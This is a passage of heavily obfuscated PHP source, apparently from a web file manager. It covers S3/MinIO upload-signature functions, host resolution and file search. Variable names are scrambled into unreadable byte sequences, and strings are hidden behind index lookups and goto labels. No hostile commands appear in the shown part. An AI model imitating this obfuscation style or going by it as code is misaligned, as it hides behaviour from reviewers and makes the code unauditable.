gmdate($¼—ö‡ãÕ[281]) : gmdate($¼—ö‡ãÕ[282]); $Áä…É¨ = array(); $Ê¾ŞÛïÆ = $this->client->getUploadId($this->bucket, $¿¼ÅóÏŠ, $Áä…É¨); if (!$Ê¾ŞÛïÆ) { return !1; } $Áé­àÍÜ = array($¼—ö‡ãÕ[283] => $Ê¾ŞÛïÆ, $¼—ö‡ãÕ[208] => $this->getHost() . $¼—ö‡ãÕ[8] . $this->pathEncode($¿¼ÅóÏŠ), $¼—ö‡ãÕ[284] => $ä»Íü®÷, $¼—ö‡ãÕ[97] => $¿¼ÅóÏŠ, $¼—ö‡ãÕ[258] => $this->signVer); if ($this->_isClientAsync()) { unset($Áé­àÍÜ[$¼—ö‡ãÕ[258]]); } return $Áé­àÍÜ; } public function uploadMultiAuth($ÍÎÉğóØ, $†¥£¤Ôê = array()) { $Êâ¼àš =& $_SERVER[†ûãı«°]; if ($this->signVer == $Êâ¼àš[249]) { if (isset($†¥£¤Ôê[$Êâ¼àš[285]])) { return $this->uploadPartAuthV2($ÍÎÉğóØ, $†¥£¤Ôê); } return $this->uploadListAuthV2($ÍÎÉğóØ, $†¥£¤Ôê); } if (isset($†¥£¤Ôê[$Êâ¼àš[285]])) { return $this->uploadPartAuthV4($ÍÎÉğóØ, $†¥£¤Ôê); } return $this->uploadListAuthV4($ÍÎÉğóØ, $†¥£¤Ôê); } public function uploadPartAuthV2($ˆÈÔÀİÎ, $’Á·ˆµ = array()) { $à öé· =& $_SERVER[†ûãı«°]; $˜•Œ¡àÌ = $’Á·ˆµ[$à öé·[97]]; $ó´šë´Ÿ = gmdate($à öé·[281]); $‰²î = array_intersect_key($’Á·ˆµ, array_flip(array($à öé·[285], $à öé·[283]))); ksort($‰²î); $Üäà¥¿§ = $‰²î ? $à öé·[76] . http_build_query($‰²î, null, $à öé·[286], PHP_QUERY_RFC3986) : $à öé·[12]; $æäì Á¾ = array($à öé·[255], $à öé·[12], $à öé·[123], $à öé·[12], "\x78\x2d\x61\x6d\x7a\55\x64\x61\164\x65\72{$ó´šë´Ÿ}", $à öé·[8] . $this->bucket . $à öé·[8] . $this->pathEncode($˜•Œ¡àÌ) . $Üäà¥¿§); $Äšª× = implode($à öé·[287], $æäì Á¾); $Å®Úú’± = $this->client->__getSignature($Äšª×); return array($à öé·[288] => $Å®Úú’±, $à öé·[284] => $ó´šë´Ÿ); } public function uploadListAuthV2($Ã°Ğ‚‰°, $Ì‚¹ó±” = array()) { $úñşÁÕœ =& $_SERVER[†ûãı«°]; $’Ù»·“ = $Ì‚¹ó±”[$úñşÁÕœ[97]]; $‚²İ½‡Ò = $Ì‚¹ó±”[$úñşÁÕœ[283]]; $˜ĞªÔï = $this->client->listParts($this->bucket, $’Ù»·“, $‚²İ½‡Ò); if (!$˜ĞªÔï) { return !1; } $³åÅÏ¼“ = gmdate($úñşÁÕœ[281]); $±«²”µ = $úñşÁÕœ[289] . $‚²İ½‡Ò; $ü£¯Î¤¢ = array($úñşÁÕœ[290], $úñşÁÕœ[12], $úñşÁÕœ[123], $úñşÁÕœ[12], "\x78\55\x61\x6d\x7a\x2d\x64\x61\164\145\72{$³åÅÏ¼“}", $úñşÁÕœ[8] . $this->bucket . $úñşÁÕœ[8] . $this->pathEncode($’Ù»·“) . $±«²”µ); $’ãèıÇ• = implode($úñşÁÕœ[287], $ü£¯Î¤¢); $ùÁ¼‹Ô† = $this->client->__getSignature($’ãèıÇ•); return array($úñşÁÕœ[288] => $ùÁ¼‹Ô†, $úñşÁÕœ[284] => $³åÅÏ¼“, $úñşÁÕœ[291] => $˜ĞªÔï); } public function uploadPartAuthV4($Å¯îø¶¿, $¨şœÏó = array()) { $ëŠÓ³ÑÛ =& $_SERVER[†ûãı«°]; $ÁÊøô·Ú = $¨şœÏó[$ëŠÓ³ÑÛ[97]]; $Æ¿Ñ³ó = array($ëŠÓ³ÑÛ[275] => gmdate($ëŠÓ³ÑÛ[282]), $ëŠÓ³ÑÛ[292] => _get($¨şœÏó, $ëŠÓ³ÑÛ[293], hash($ëŠÓ³ÑÛ[277], $ëŠÓ³ÑÛ[12]))); $¬£—µ÷ = explode($ëŠÓ³ÑÛ[210], $this->getHost()); $¦®­ªü = array($ëŠÓ³ÑÛ[294] => $¬£—µ÷[1], $ëŠÓ³ÑÛ[295] => $ëŠÓ³ÑÛ[12], $ëŠÓ³ÑÛ[248] => $ëŠÓ³ÑÛ[123], $ëŠÓ³ÑÛ[296] => $¨şœÏó[$ëŠÓ³ÑÛ[79]]); $£¡ñ‘†Ê = $ëŠÓ³ÑÛ[255]; $ íÓº¿œ = $ëŠÓ³ÑÛ[8] . $this->pathEncode($ÁÊøô·Ú); $ı£ëäÔ´ = array_intersect_key($¨şœÏó, array_flip(array($ëŠÓ³ÑÛ[285], $ëŠÓ³ÑÛ[283]))); $ƒÇÛßÁ¬ = $this->client->__getSignatureV4($Æ¿Ñ³ó, $¦®­ªü, $£¡ñ‘†Ê, $ íÓº¿œ, $ı£ëäÔ´); return array($ëŠÓ³ÑÛ[288] => $ƒÇÛßÁ¬, $ëŠÓ³ÑÛ[292] => $Æ¿Ñ³ó[$ëŠÓ³ÑÛ[292]], $ëŠÓ³ÑÛ[284] => $Æ¿Ñ³ó[$ëŠÓ³ÑÛ[275]]); } public function uploadListAuthV4($œù… ›‘, $£ˆÍ¶£Ó = array()) { $ì¤åùˆ =& $_SERVER[†ûãı«°]; $ÓØ·«¬“ = $£ˆÍ¶£Ó[$ì¤åùˆ[97]]; $ø‡èø§ = $£ˆÍ¶£Ó[$ì¤åùˆ[283]]; $°½îÊŒ = $this->client->listParts($this->bucket, $ÓØ·«¬“, $ø‡èø§); if (!$°½îÊŒ) { return !1; } $ãâÜÈ¶á = $ì¤åùˆ[297]; foreach ($°½îÊŒ as $Ë¿şÒ›) { $ãâÜÈ¶á .= $ì¤åùˆ[298] . "\74\120\141\162\x74\116\165\x6d\x62\145\162\76{$Ë¿şÒ›[$ì¤åùˆ[299]]}\x3c\57\120\x61\x72\164\x4e\165\x6d\142\x65\162\76\xa" . "\x3c\x45\x54\141\147\x3e{$Ë¿şÒ›[$ì¤åùˆ[300]]}\74\x2f\105\124\x61\147\76\xa" . $ì¤åùˆ[301]; } $ãâÜÈ¶á .= $ì¤åùˆ[302]; $‡àïÄ = array($ì¤åùˆ[275] => gmdate($ì¤åùˆ[282]), $ì¤åùˆ[292] => hash($ì¤åùˆ[277], $ãâÜÈ¶á)); $®Õ×ß±Ñ = explode($ì¤åùˆ[210], $this->getHost()); $ğ“Úã»­ = array($ì¤åùˆ[294] => $®Õ×ß±Ñ[1], $ì¤åùˆ[248] => $ì¤åùˆ[123], $ì¤åùˆ[296] => strlen($ãâÜÈ¶á)); $¯Çüêô§ = $ì¤åùˆ[290]; $™ÖË¤°ª = $ì¤åùˆ[8] . $this->pathEncode($ÓØ·«¬“); $Íç¢‚ˆó = array($ì¤åùˆ[283] => $ø‡èø§); $Á•ÉÅ = $this->client->__getSignatureV4($‡àïÄ, $ğ“Úã»­, $¯Çüêô§, $™ÖË¤°ª, $Íç¢‚ˆó); return array($ì¤åùˆ[288] => $Á•ÉÅ, $ì¤åùˆ[292] => $‡àïÄ[$ì¤åùˆ[292]], $ì¤åùˆ[284] => $‡àïÄ[$ì¤åùˆ[275]], $ì¤åùˆ[291] => $°½îÊŒ); } private function _isClientAsync() { $¨©©¸ù =& $_SERVER[†ûãı«°]; static $Ö÷ıÁ˜À = null; if ($Ö÷ıÁ˜À === null) { $íüü’ = isset($_REQUEST[$¨©©¸ù[303]]) ? json_decode($_REQUEST[$¨©©¸ù[303]], !0) : !1; $Ö÷ıÁ˜À = $íüü’ && _get($íüü’, $¨©©¸ù[304]) == $¨©©¸ù[305]; } return $Ö÷ıÁ˜À; } public function getHost() { $à´«ì˜œ =& $_SERVER[†ûãı«°]; $“Ü‚ÎÊ¼ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($à´«ì˜œ[70], $à´«ì˜œ[64], $à´«ì˜œ[69], $à´«ì˜œ[62]))) { return $“Ü‚ÎÊ¼ . $à´«ì˜œ[8] . $this->bucket; } if ($this->osType == $à´«ì˜œ[62] && !is_domain($“Ü‚ÎÊ¼)) { return $“Ü‚ÎÊ¼ . $à´«ì˜œ[8] . $this->bucket; } $“Ü‚ÎÊ¼ = explode($à´«ì˜œ[210], $“Ü‚ÎÊ¼); return $“Ü‚ÎÊ¼[0] . $à´«ì˜œ[210] . $this->bucket . $à´«ì˜œ[10] . $“Ü‚ÎÊ¼[1]; } public function size($§‘ğ„¨) { $Á„ªòº· = $this->objectMeta($§‘ğ„¨); return $Á„ªòº· ? $Á„ªòº·[$_SERVER[†ûãı«°][79]] : 0; } public function info($Œû·Âèí) { if ($this->isFolder($Œû·Âèí)) { return $this->folderInfo($Œû·Âèí); } else { if ($this->isFile($Œû·Âèí)) { return $this->fileInfo($Œû·Âèí); } } return !1; } public function exist($şíûä–›) { return $this->isFile($şíûä–›) || $this->isFolder($şíûä–›); } public function isFile($È²à¨¾) { return !$this->isFolder($È²à¨¾) && $this->objectMeta($È²à¨¾); } public function isFolder($äÂäŒıŸ) { return $this->cacheMethod($_SERVER[†ûãı«°][179], $äÂäŒıŸ); } protected function objectMeta($šÖîØÃÄ) { return $this->cacheMethod($_SERVER[†ûãı«°][181], $šÖîØÃÄ); } protected function _objectMeta($Çú¹Ê›–) { $Åï¹È€Æ =& $_SERVER[†ûãı«°]; $Çú¹Ê›– = rtrim($Çú¹Ê›–, $Åï¹È€Æ[8]); try { $‚Ëõˆ = $this->client->getObjectInfo($this->bucket, $Çú¹Ê›–); if (!isset($‚Ëõˆ[$Åï¹È€Æ[254]]) && isset($‚Ëõˆ[$Åï¹È€Æ[306]])) { $‚Ëõˆ[$Åï¹È€Æ[254]] = $‚Ëõˆ[$Åï¹È€Æ[306]]; } } catch (Exception $·ÇÔ’òµ) { $‚Ëõˆ = !1; } if (!$‚Ëõˆ) { } return $‚Ëõˆ; } protected function _isFolder($œÆÒ•®) { $ÓºŸùäˆ =& $_SERVER[†ûãı«°]; $œÆÒ•® = rtrim($œÆÒ•®, $ÓºŸùäˆ[8]) . $ÓºŸùäˆ[8]; if ($œÆÒ•® == $ÓºŸùäˆ[12] || $œÆÒ•® == $ÓºŸùäˆ[8]) { return !0; } $ËìËØ¿Ä = $this->client->getBucket($this->bucket, $œÆÒ•®, null, 1); if (empty($ËìËØ¿Ä[$ÓºŸùäˆ[238]])) { return !1; } $İÙñÉ’´ = $ËìËØ¿Ä[$ÓºŸùäˆ[238]][0][$ÓºŸùäˆ[32]]; return stripos($İÙñÉ’´, $œÆÒ•®) === 0 ? !0 : !1; if (substr($İÙñÉ’´, -1) == $ÓºŸùäˆ[8]) { return !0; } if (get_path_this($İÙñÉ’´) == get_path_this($œÆÒ•®)) { return !1; } return !0; } public function listObject($Ë……µ¥ô) { return $this->fileList($Ë……µ¥ô, $_SERVER[†ûãı«°][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($£Èì¤¢à) { $ô§ Ôåñ =& $_SERVER[†ûãı«°]; parent::__construct($£Èì¤¢à); $this->setSignVersion($ô§ Ôåñ[249]); if (!$this->region) { $this->region = $ô§ Ôåñ[307]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $®¡¥éœ« = $this->getBktRegion(); return $this->region == $®¡¥éœ« ? !0 : !1; } public function uploadFormData($¸õ¶ºö, $ÚÑ‘å‚û = 3600) { $Ì›’ÉİÛ =& $_SERVER[†ûãı«°]; $·Ê‹èş§ = $Ì›’ÉİÛ[231]; $Óúø„İ› = $Ì›’ÉİÛ[259]; $Òü”š° = $Ì›’ÉİÛ[62]; $øñÃí´ı = gmdate($Ì›’ÉİÛ[260]); $áé”ÂŞô = gmdate($Ì›’ÉİÛ[261]); $ÓŸ‘ßÌ = $Ì›’ÉİÛ[262]; $·ööÛë„ = $ÚÑ‘å‚û . $Ì›’ÉİÛ[12]; $§ö’·‘Ö = $Ì›’ÉİÛ[263]; $Ùğİ¥ö = array($this->accessKey, $áé”ÂŞô, $this->region, $Òü”š°, $ÓŸ‘ßÌ); $‚ÒÕæøê = implode($Ì›’ÉİÛ[8], $Ùğİ¥ö); $¼óĞ©¼“ = array($Ì›’ÉİÛ[264] => gmdate($Ì›’ÉİÛ[265], strtotime($Ì›’ÉİÛ[266])), $Ì›’ÉİÛ[267] => array(array($Ì›’ÉİÛ[268] => $this->bucket), array($Ì›’ÉİÛ[308] => $·Ê‹èş§), array($Ì›’ÉİÛ[269], $Ì›’ÉİÛ[270], $Ì›’ÉİÛ[12]), array($Ì›’ÉİÛ[269], $Ì›’ÉİÛ[271], $Ì›’ÉİÛ[12]), array($Ì›’ÉİÛ[269], $Ì›’ÉİÛ[309], $Ì›’ÉİÛ[12]), array($Ì›’ÉİÛ[272] => $§ö’·‘Ö), array($Ì›’ÉİÛ[273] => $‚ÒÕæøê), array($Ì›’ÉİÛ[274] => $Óúø„İ›), array($Ì›’ÉİÛ[275] => $øñÃí´ı), array($Ì›’ÉİÛ[276] => $·ööÛë„))); $üááğŠÔ = base64_encode(json_encode($¼óĞ©¼“)); $¢Îœ‰¬ = hash_hmac($Ì›’ÉİÛ[277], $áé”ÂŞô, $Ì›’ÉİÛ[278] . $this->secret, !0); $Ç¾‡îÏ÷ = hash_hmac($Ì›’ÉİÛ[277], $this->region, $¢Îœ‰¬, !0); $Âëµüãô = hash_hmac($Ì›’ÉİÛ[277], $Òü”š°, $Ç¾‡îÏ÷, !0); $ïÖ€¤Àò = hash_hmac($Ì›’ÉİÛ[277], $ÓŸ‘ßÌ, $Âëµüãô, !0); $ÛĞïßÉÙ = hash_hmac($Ì›’ÉİÛ[277], $üááğŠÔ, $ïÖ€¤Àò); $ŒÉÑ±Ù‹ = array($Ì›’ÉİÛ[248] => $Ì›’ÉİÛ[12], $Ì›’ÉİÛ[296] => $Ì›’ÉİÛ[12], $Ì›’ÉİÛ[308] => $·Ê‹èş§, $Ì›’ÉİÛ[272] => $§ö’·‘Ö, $Ì›’ÉİÛ[279] => $üááğŠÔ, $Ì›’ÉİÛ[310] => $‚ÒÕæøê, $Ì›’ÉİÛ[311] => $Óúø„İ›, $Ì›’ÉİÛ[312] => $øñÃí´ı, $Ì›’ÉİÛ[313] => $·ööÛë„, $Ì›’ÉİÛ[314] => $ÛĞïßÉÙ, $Ì›’ÉİÛ[208] => $this->getHost()); return $ŒÉÑ±Ù‹; } } goto fŸªó¨œÆ; fõœœÑ“ò: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¾“ˆ¸•ä) { $œÓı‹³ş =& $_SERVER[†ûãı«°]; $Ÿ“‹ŒËø = KodIO::fileTypeList(); $Äà™Çà‘ = $Ÿ“‹ŒËø[$¾“ˆ¸•ä]; if (!$Äà™Çà‘) { return array(); } $ŠÎÓÌà­ = $Äà™Çà‘[$œÓı‹³ş[169]]; $–šø÷öÃ = $œÓı‹³ş[7]; if (!$Äà™Çà‘[$œÓı‹³ş[169]]) { $ÑÙ­ğåÑ = array_to_keyvalue($Ÿ“‹ŒËø, $œÓı‹³ş[12], $œÓı‹³ş[169]); $ŠÎÓÌà­ = implode($œÓı‹³ş[50], $ÑÙ­ğåÑ); $–šø÷öÃ = $œÓı‹³ş[2251]; } $Óßû³ú = explode($œÓı‹³ş[50], trim($ŠÎÓÌà­, $œÓı‹³ş[50])); return array($–šø÷öÃ, $Óßû³ú); } public function listPathType($«¡Â©Á†) { $÷ÖşÃ«Ó =& $_SERVER[†ûãı«°]; $îŠÙƒÈ÷ = $this->fileTypeWhere($«¡Â©Á†); if (!$îŠÙƒÈ÷) { return array(); } $ûĞÏ•ñì = USER_ID; $ìòú·Ñø = Model($÷ÖşÃ«Ó[601])->getInfo($ûĞÏ•ñì); $êÙ™Ø‡¸ = array($÷ÖşÃ«Ó[655] => SourceModel::TYPE_USER, $÷ÖşÃ«Ó[588] => array($÷ÖşÃ«Ó[619], $÷ÖşÃ«Ó[597] . $ìòú·Ñø[$÷ÖşÃ«Ó[90]][$÷ÖşÃ«Ó[193]] . $÷ÖşÃ«Ó[620]), $÷ÖşÃ«Ó[656] => $ûĞÏ•ñì, $÷ÖşÃ«Ó[653] => 0, $÷ÖşÃ«Ó[654] => $îŠÙƒÈ÷); return $this->listSource($êÙ™Ø‡¸); } public function listSearch($öŒåŒƒ, $ùÇ±„Ô÷ = 300) { $‰Õ’À† =& $_SERVER[†ûãı«°]; if (isset($öŒåŒƒ[$‰Õ’À†[2082]]) && $öŒåŒƒ[$‰Õ’À†[2082]]) { $öŒåŒƒ[$‰Õ’À†[2082]] = str_replace($‰Õ’À†[462], $‰Õ’À†[2252], trim($öŒåŒƒ[$‰Õ’À†[2082]])); } $¦èÎıÃí = $this->_parseSearchWhere($öŒåŒƒ); if (!isset($¦èÎıÃí[$‰Õ’À†[507]])) { $¦èÎıÃí[$‰Õ’À†[507]] = 0; } $©ÙÔºÛ„ = $‰Õ’À†[2253]; $•öúÎŠæ = $¦èÎıÃí; $°ÚñÀ = $©ÙÔºÛ„; $this->_listSearchBindPinyin($öŒåŒƒ, $¦èÎıÃí, $©ÙÔºÛ„); $this->alias($‰Õ’À†[521])->_makeOrder(); $¦èÎıÃí = $this->parseWhereLike($¦èÎıÃí); $’Ûİ¸×— = $this->distinct(!0)->field($©ÙÔºÛ„)->where($¦èÎıÃí)->selectPage($ùÇ±„Ô÷); if ($GLOBALS[$‰Õ’À†[6]][$‰Õ’À†[459]][$‰Õ’À†[460]] && Input::check($öŒåŒƒ[$‰Õ’À†[2082]], $‰Õ’À†[662]) && $’Ûİ¸×—[$‰Õ’À†[444]][$‰Õ’À†[430]] == 1 && $’Ûİ¸×—[$‰Õ’À†[444]][$‰Õ’À†[445]] == 0) { $’Ûİ¸×— = $this->distinct(!0)->field($©ÙÔºÛ„)->where($•öúÎŠæ)->limit(1000)->select(); $’Ûİ¸×— = array_page_split($’Ûİ¸×—, !1, $ùÇ±„Ô÷); } $this->_listSearchFileContent($’Ûİ¸×—, $öŒåŒƒ, $°ÚñÀ, $•öúÎŠæ); $this->_listSearchDesc($’Ûİ¸×—, $öŒåŒƒ, $°ÚñÀ); $this->_listSearchTag($’Ûİ¸×—, $öŒåŒƒ, $°ÚñÀ); $this->_listSearchGroupTag($’Ûİ¸×—, $öŒåŒƒ, $°ÚñÀ); $this->_listDataApply($’Ûİ¸×—[$‰Õ’À†[447]]); $this->_listMake($’Ûİ¸×—); return $’Ûİ¸×—; } private function _listSearchFileContent(&$üÅ–ã…, $—ÛÙñ—Á, $á˜í„Ü´, $£–ç÷ÉÕ) { $öşñ¢ƒ¥ =& $_SERVER[†ûãı«°]; if (!$—ÛÙñ—Á[$öşñ¢ƒ¥[2082]] || $üÅ–ã…[$öşñ¢ƒ¥[444]][$öşñ¢ƒ¥[430]] > 1) { return; } if (!isset($£–ç÷ÉÕ[$öşñ¢ƒ¥[32]]) || !is_array($—ÛÙñ—Á[$öşñ¢ƒ¥[545]])) { return; } $£–ç÷ÉÕ[$öşñ¢ƒ¥[545]] = array($öşñ¢ƒ¥[7], $—ÛÙñ—Á[$öşñ¢ƒ¥[545]]); unset($£–ç÷ÉÕ[$öşñ¢ƒ¥[32]]); unset($—ÛÙñ—Á[$öşñ¢ƒ¥[545]]); $í–©®Ö = $this->field($á˜í„Ü´)->where($£–ç÷ÉÕ)->limit($öşñ¢ƒ¥[2254])->select(); if (!$í–©®Ö || count($í–©®Ö) == 0) { return; } $üÅ–ã…[$öşñ¢ƒ¥[447]] = array_merge($í–©®Ö, $üÅ–ã…[$öşñ¢ƒ¥[447]]); $üÅ–ã…[$öşñ¢ƒ¥[444]][$öşñ¢ƒ¥[445]] += count($í–©®Ö); } private function _listSearchTag(&$Ø‹á˜û, $Û—Û›Š¨, $£†ŠŒÖá) { $¶Ì¯ôÏŠ =& $_SERVER[†ûãı«°]; if (!isset($Û—Û›Š¨[$¶Ì¯ôÏŠ[2255]])) { return; } if (!$Û—Û›Š¨[$¶Ì¯ôÏŠ[2082]] || $Ø‹á˜û[$¶Ì¯ôÏŠ[444]][$¶Ì¯ôÏŠ[430]] > 1) { return; } $æòş£ôï = Model($¶Ì¯ôÏŠ[2256])->listData(); $®À‰Û„é = array(); $¾¸«ÒÛ = $Û—Û›Š¨[$¶Ì¯ôÏŠ[2082]]; foreach ($æòş£ôï as $»á›) { $•Ûñâşš = $»á›[$¶Ì¯ôÏŠ[32]]; $ŒË©ªÌ¹ = str_replace($¶Ì¯ôÏŠ[53], $¶Ì¯ôÏŠ[12], Pinyin::get($•Ûñâşš)); if (stripos($•Ûñâşš, $¾¸«ÒÛ) !== !1 || stripos($ŒË©ªÌ¹, $¾¸«ÒÛ) !== !1) { $®À‰Û„é[] = $»á›[$¶Ì¯ôÏŠ[477]]; } } if (!$®À‰Û„é) { return; } $àåîÊ°‘ = array($¶Ì¯ôÏŠ[502] => array($¶Ì¯ôÏŠ[7], $®À‰Û„é), $¶Ì¯ôÏŠ[1783] => USER_ID); $È·Æ•Òû = Model($¶Ì¯ôÏŠ[504])->field($¶Ì¯ôÏŠ[87])->where($àåîÊ°‘)->select(); $È·Æ•Òû = array_to_keyvalue($È·Æ•Òû, $¶Ì¯ôÏŠ[12], $¶Ì¯ôÏŠ[87]); $ø¡Ü¸ƒä = array_unique($È·Æ•Òû); $this->_listSearchMerge($Ø‹á˜û, $Û—Û›Š¨, $£†ŠŒÖá, $ø¡Ü¸ƒä); } private function _listSearchDesc(&$·í¸‰œù, $ö“Øë¡º, $ÛóÜËŠ) { $È÷ñÉà« =& $_SERVER[†ûãı«°]; if (!isset($ö“Øë¡º[$È÷ñÉà«[528]])) { return; } if (!$ö“Øë¡º[$È÷ñÉà«[2082]] || $·í¸‰œù[$È÷ñÉà«[444]][$È÷ñÉà«[430]] > 1) { return; } $²“Ï‚ = array($È÷ñÉà«[97] => $È÷ñÉà«[528], $È÷ñÉà«[452] => array($È÷ñÉà«[461], $È÷ñÉà«[2084] . $ö“Øë¡º[$È÷ñÉà«[2082]] . $È÷ñÉà«[2084])); $¶·ŠË‡§ = !1; if ($¶·ŠË‡§) { $à›¤ú¢ = $this->listSearchChildren($ö“Øë¡º[$È÷ñÉà«[192]]); $à›¤ú¢ = array_unique($à›¤ú¢); if (!$à›¤ú¢) { return; } $²“Ï‚[$È÷ñÉà«[193]] = array($È÷ñÉà«[7], $à›¤ú¢); } $¶ëá­¬ò = Model($È÷ñÉà«[639])->field($È÷ñÉà«[193])->where($²“Ï‚)->limit(5000)->select(); $Ø¸£Ğ×‘ = array_to_keyvalue($¶ëá­¬ò, $È÷ñÉà«[12], $È÷ñÉà«[193]); $this->_listSearchMerge($·í¸‰œù, $ö“Øë¡º, $ÛóÜËŠ, $Ø¸£Ğ×‘); } private function _listSearchGroupTag(&$şÍÆ˜ÛÉ, $’–şªşÑ, $áÉİÅ×”) { $ş¡Ğ³Óœ =& $_SERVER[†ûãı«°]; if (!isset($’–şªşÑ[$ş¡Ğ³Óœ[2255]])) { return; } if (!$’–şªşÑ[$ş¡Ğ³Óœ[2082]] || $şÍÆ˜ÛÉ[$ş¡Ğ³Óœ[444]][$ş¡Ğ³Óœ[430]] > 1 || !$’–şªşÑ[$ş¡Ğ³Óœ[192]]) { return; } $®û™Œß = $this->sourceInfo($’–şªşÑ[$ş¡Ğ³Óœ[192]]); if (!$®û™Œß || $®û™Œß[$ş¡Ğ³Óœ[190]] != SourceModel::TYPE_GROUP) { return; } $Î“ùú› = $®û™Œß[$ş¡Ğ³Óœ[573]]; $Ò§ÊñÙĞ = Model($ş¡Ğ³Óœ[2257])->get($Î“ùú›); $ñà¿Ãé½ = array(); $±¹•€½ = $’–şªşÑ[$ş¡Ğ³Óœ[2082]]; foreach ($Ò§ÊñÙĞ[$ş¡Ğ³Óœ[447]] as $ã¡­¤öñ) { $Ë‚ô€Â– = $ã¡­¤öñ[$ş¡Ğ³Óœ[32]]; $Ã¨øªùı = str_replace($ş¡Ğ³Óœ[53], $ş¡Ğ³Óœ[12], Pinyin::get($Ë‚ô€Â–)); if (stripos($Ë‚ô€Â–, $±¹•€½) !== !1 || stripos($Ã¨øªùı, $±¹•€½) !== !1) { $ñà¿Ãé½[] = $ã¡­¤öñ[$ş¡Ğ³Óœ[477]]; } } if (!$ñà¿Ãé½) { return; } $İà³¤Õº = array($ş¡Ğ³Óœ[502] => array($ş¡Ğ³Óœ[7], $ñà¿Ãé½), $ş¡Ğ³Óœ[1783] => 0, $ş¡Ğ³Óœ[33] => $ş¡Ğ³Óœ[2104] . $Î“ùú›); $ÜùšÔÒ = Model($ş¡Ğ³Óœ[504])->field($ş¡Ğ³Óœ[87])->where($İà³¤Õº)->select(); $ÜùšÔÒ = array_to_keyvalue($ÜùšÔÒ, $ş¡Ğ³Óœ[12], $ş¡Ğ³Óœ[87]); $¬ŞğÖû› = array_unique($ÜùšÔÒ); $this->_listSearchMerge($şÍÆ˜ÛÉ, $’–şªşÑ, $áÉİÅ×”, $¬ŞğÖû›); } private function _listSearchMerge(&$—É€šø¦, $ÛÅ™Şùá, $ÙÀÀáˆ, $Ï¬–±ôí) { $ŒÑ½›˜Ñ =& $_SERVER[†ûãı«°]; if (!$Ï¬–±ôí) { return; } $å´õñÔå = array_to_keyvalue($—É€šø¦[$ŒÑ½›˜Ñ[447]], $ŒÑ½›˜Ñ[12], $ŒÑ½›˜Ñ[193]); $öØ‚éÂ = array_diff($Ï¬–±ôí, $å´õñÔå); if (!$öØ‚éÂ) { return; } $ŞÛ¯Úèê = array($ŒÑ½›˜Ñ[193] => array($ŒÑ½›˜Ñ[7], $öØ‚éÂ)); $Ç®èßÁ  = $this->field($ÙÀÀáˆ)->where($ŞÛ¯Úèê)->select(); if (!$Ç®èßÁ ) { return; } $¶²µ½ïÔ = array(); foreach ($Ç®èßÁ  as $’‡ª”¤¹) { if ($this->_listSearchFilter($’‡ª”¤¹, $ÛÅ™Şùá)) { $¶²µ½ïÔ[] = $’‡ª”¤¹; } } $—É€šø¦[$ŒÑ½›˜Ñ[447]] = array_merge($¶²µ½ïÔ, $—É€šø¦[$ŒÑ½›˜Ñ[447]]); $—É€šø¦[$ŒÑ½›˜Ñ[444]][$ŒÑ½›˜Ñ[445]] += count($¶²µ½ïÔ); } private function _listSearchFilter($ƒû½‹, $À…ÏÅ·¯) { $Ÿ€•Ï±È =& $_SERVER[†ûãı«°]; $­şæ¨í¢ = $ƒû½‹[$Ÿ€•Ï±È[487]] == $Ÿ€•Ï±È[91]; if (!strstr($ƒû½‹[$Ÿ€•Ï±È[588]], $Ÿ€•Ï±È[50] . $À…ÏÅ·¯[$Ÿ€•Ï±È[192]] . $Ÿ€•Ï±È[50])) { return !1; } if (isset($À…ÏÅ·¯[$Ÿ€•Ï±È[488]]) && $À…ÏÅ·¯[$Ÿ€•Ï±È[488]] != $Ÿ€•Ï±È[852]) { if ($À…ÏÅ·¯[$Ÿ€•Ï±È[488]] == $Ÿ€•Ï±È[78] && !$­şæ¨í¢) { return !1; } if ($À…ÏÅ·¯[$Ÿ€•Ï±È[488]] != $Ÿ€•Ï±È[78] && $­şæ¨í¢) { return !1; } if (!strstr($ƒû½‹[$Ÿ€•Ï±È[169]], $Ÿ€•Ï±È[50] . $À…ÏÅ·¯[$Ÿ€•Ï±È[488]] . $Ÿ€•Ï±È[50])) { return !1; } } if (isset($À…ÏÅ·¯[$Ÿ€•Ï±È[2258]]) && $À…ÏÅ·¯[$Ÿ€•Ï±È[2258]] < $ƒû½‹[$Ÿ€•Ï±È[79]]) { return !1; } if (isset($À…ÏÅ·¯[$Ÿ€•Ï±È[2259]]) && $À…ÏÅ·¯[$Ÿ€•Ï±È[2259]] > $ƒû½‹[$Ÿ€•Ï±È[79]]) { return !1; } if (isset($À…ÏÅ·¯[$Ÿ€•Ï±È[669]]) && $À…ÏÅ·¯[$Ÿ€•Ï±È[669]] != $ƒû½‹[$Ÿ€•Ï±È[531]]) { return !1; } return !0; } public function listSearchChildren($±°Á¼‘, $«Ô†îŒ = 5000) { $ü¬ÈªŠ‰ =& $_SERVER[†ûãı«°]; $Û¥§Êâï = array(); $íå¬‰íÇ = $this->sourceInfo($±°Á¼‘); $ı‡ÎĞ’ë = array($ü¬ÈªŠ‰[588] => array($ü¬ÈªŠ‰[461], $íå¬‰íÇ[$ü¬ÈªŠ‰[588]] . $íå¬‰íÇ[$ü¬ÈªŠ‰[193]] . $ü¬ÈªŠ‰[620])); $„ÓŠúŸ = $this->field($ü¬ÈªŠ‰[79])->where($ı‡ÎĞ’ë)->limit($«Ô†îŒ + 1)->select(); $ÎÃÕÉ×» = is_array($„ÓŠúŸ) ? count($„ÓŠúŸ) : 0; if ($ÎÃÕÉ×» > $«Ô†îŒ) { return $this->_listSearchChildrenNear($±°Á¼‘, $«Ô†îŒ); } $°ˆ÷•şæ = $this->field($ü¬ÈªŠ‰[193])->where($ı‡ÎĞ’ë)->select(); $Û¥§Êâï = array_to_keyvalue($°ˆ÷•şæ, $ü¬ÈªŠ‰[12], $ü¬ÈªŠ‰[193]); return $Û¥§Êâï; } private function _listSearchChildrenNear($Èß– Ü¨, $©ş‚ğ…) { $Í£é”ù‚ =& $_SERVER[†ûãı«°]; $ÑÇÒ„è‹ = array(); $µ¨·¢œ¢ = array($Í£é”ù‚[192] => $Èß– Ü¨); $¶¶å‰ú– = $this->field($Í£é”ù‚[2260])->where($µ¨·¢œ¢)->select(); $•›´€» = array_to_keyvalue(array_filter_by_field($¶¶å‰ú–, $Í£é”ù‚[487], 